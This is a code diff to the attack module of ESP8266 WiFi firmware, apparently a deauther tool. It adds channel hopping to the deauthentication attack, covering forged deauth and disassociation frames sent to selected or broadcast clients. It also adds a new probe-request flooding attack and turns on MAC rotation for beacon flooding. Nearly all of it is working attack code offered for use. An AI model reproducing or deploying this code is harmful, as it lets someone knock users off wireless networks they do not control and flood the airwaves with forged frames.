@@ -5,7 +5,7 @@ Attack::Attack(){
 }
 
 void Attack::generate(){
-  if(debug) Serial.print("generating Macs...");
+  if(debug) Serial.print("\n generating Macs...");
   
   Mac _randomBeaconMac;
   uint8_t _randomMacBuffer[6];
@@ -80,6 +80,24 @@ void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt){
   
 }
 
+void Attack::buildProbe(String _ssid, Mac _mac){
+  int len = _ssid.length();
+  if(len > 32) len = 32;
+  packetSize = 0;
+
+  for(int i=0;i<sizeof(probePacket);i++) packet[packetSize+i] = probePacket[i];
+  packetSize += sizeof(probePacket);
+
+  for(int i=0;i<6;i++) packet[10+i] = _mac._get(i);
+
+  packet[packetSize] = len;
+  packetSize++;
+  
+  for(int i=0;i<len;i++) packet[packetSize+i] = _ssid[i];
+  packetSize += len;
+  
+}
+
 bool Attack::send(){
   if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
     /*
@@ -101,7 +119,7 @@ void Attack::run(){
   
   /* =============== Deauth Attack =============== */
   if(isRunning[0] && currentMillis-prevTime[0] >= 1000){
-    if(debug) Serial.print("running "+(String)attackNames[0]+" attack");
+    if(debug) Serial.print("running "+(String)attackNames[0]+" attack...");
     prevTime[0] = millis();
     
     for(int a=0;a<apScan.results;a++){
@@ -117,23 +135,47 @@ void Attack::run(){
           if(clientScan.getClientSelected(i)){
             _selectedClients++;
 
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
+            if(settings.channelHop){
+              for(int j=1;j<12;j++){
+                wifi_set_channel(j);
+                
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+                
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+              }
+            }else{
+              buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              
+              buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+            }
           }
         }
         
         if(_selectedClients == 0){
           Mac _client;
           _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
-          buildDeauth(_ap, _client, 0xc0, 0x01 );
-          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
-          buildDeauth(_ap, _client, 0xa0, 0x01 );
-          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+
+          if(settings.channelHop){
+              for(int j=1;j<12;j++){
+                wifi_set_channel(j);
+
+                buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+                
+                buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+              }
+            }else{
+              buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              
+              buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+            }
         }
         
       } 
@@ -150,7 +192,7 @@ void Attack::run(){
 
   /* =============== Beacon clone Attack =============== */
   if(isRunning[1] && currentMillis-prevTime[1] >= 100){
-    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
+    if(debug) Serial.print("running "+(String)attackNames[1]+" attack...");
     prevTime[1] = millis();
     
     for(int a=0;a<apScan.results;a++){
@@ -193,7 +235,7 @@ void Attack::run(){
       generate();
       macListChangeCounter = 0;
     }
-    if(debug) Serial.println(" done ");
+    if(debug) Serial.println(" done");
     if(settings.attackTimeout > 0){
       attackTimeoutCounter[1]++;
       if(attackTimeoutCounter[1]/10 > settings.attackTimeout) stop(1);
@@ -202,7 +244,7 @@ void Attack::run(){
 
   /* =============== Beacon list Attack =============== */
   if(isRunning[2] && currentMillis-prevTime[2] >= 100){
-    if(debug) Serial.print("running "+(String)attackNames[2]+" attack");
+    if(debug) Serial.print("running "+(String)attackNames[2]+" attack...");
     prevTime[2] = millis();
     
     for(int a=0;a<ssidList.len;a++){
@@ -216,39 +258,75 @@ void Attack::run(){
     
     stati[2] = (String)(packetsCounter[2]*10)+"pkts/s";
     packetsCounter[2] = 0;
-    /*macListChangeCounter++;
+    macListChangeCounter++;
     if(macListChangeCounter/10 >= macChangeInterval && macChangeInterval > 0){
       generate();
       macListChangeCounter = 0;
-    }*/
-    if(debug) Serial.println("done");
+    }
+    if(debug) Serial.println(" done");
     if(settings.attackTimeout > 0){
       attackTimeoutCounter[2]++;
       if(attackTimeoutCounter[2]/10 > settings.attackTimeout) stop(2);
+    }
+  }
+
+  /* =============== Probe Request Attack =============== */
+  if(isRunning[3] && currentMillis-prevTime[3] >= 1000){
+    if(debug) Serial.print("running "+(String)attackNames[3]+" attack...");
+    prevTime[3] = millis();
+    
+    for(int a=0;a<ssidList.len;a++){
+      buildProbe(ssidList.get(a), beaconAdrs._get(a));
+      if(send()) packetsCounter[3]++;
+    }
+    
+    stati[3] = (String)(packetsCounter[3]*10)+"pkts/s";
+    packetsCounter[3] = 0;
+    macListChangeCounter++;
+    if(macListChangeCounter >= macChangeInterval && macChangeInterval > 0){
+      generate();
+      macListChangeCounter = 0;
+    }
+    if(debug) Serial.println("done");
+    if(settings.attackTimeout > 0){
+      attackTimeoutCounter[3]++;
+      if(attackTimeoutCounter[3] > settings.attackTimeout) stop(3);
     }
   }
   
 }
 
 void Attack::start(int num){
+  Serial.println(num);
   if(!isRunning[num]){
+    Serial.println(num);
     isRunning[num] = true;
     stati[num] = "starting";
     prevTime[num] = millis();
     attackTimeoutCounter[num] = 0;
-    if(debug) Serial.println("starting "+(String)attackNames[num]+" attack");
-    if(num == 1 && isRunning[2]) stop(2);
-    else if(num == 2 && isRunning[1]) stop(1);
+    refreshLed();
+    if(debug) Serial.println("starting "+(String)attackNames[num]+" attack...");
+    if(num == 1){
+      stop(2);
+      stop(3);
+    } else if(num == 2){
+      stop(1);
+      stop(3);
+    } else if(num == 3){
+      stop(1);
+      stop(2);
+    }
   }else stop(num);
 }
 
 void Attack::stop(int num){
   if(isRunning[num]){
-    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
+    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack...");
     isRunning[num] = false;
     stati[num] = "ready";
     prevTime[num] = millis();
-  }
+    refreshLed();
+  } 
 }
 
 void Attack::stopAll(){
@@ -261,7 +339,7 @@ String Attack::getResults(){
   for(int i=0;i<attacksNum;i++) if(!isRunning[i]) stati[i] = "ready";
     
   if(apScan.getFirstTarget() < 0) stati[0] = stati[1] = "no AP";
-  if(ssidList.len < 1) stati[2] = "no SSID";
+  if(ssidList.len < 1) stati[2] = stati[3] = "no SSID";
 
   int _selected;
   String json = "{ \"aps\": [";
@@ -307,7 +385,24 @@ String Attack::getResults(){
   json += "}";
   if(debug){
     Serial.println(json);
-    Serial.println("done ");
+    Serial.println("done");
   }
   return json;
 }
+
+void Attack::refreshLed(){
+   int numberRunning = 0;
+   for(int i=0; i<sizeof(isRunning); i++){
+    if(isRunning[i]) numberRunning++;
+    //if(debug) Serial.println(numberRunning);
+   }
+  if(numberRunning>=1 && settings.useLed){
+    if(debug) Serial.println("Attack LED : ON");
+    digitalWrite(2, LOW);
+  }
+  else if(numberRunning==0 || !settings.useLed){
+    if(debug) Serial.println("Attack LED : OFF");
+    digitalWrite(2, HIGH);
+  }
+}
+
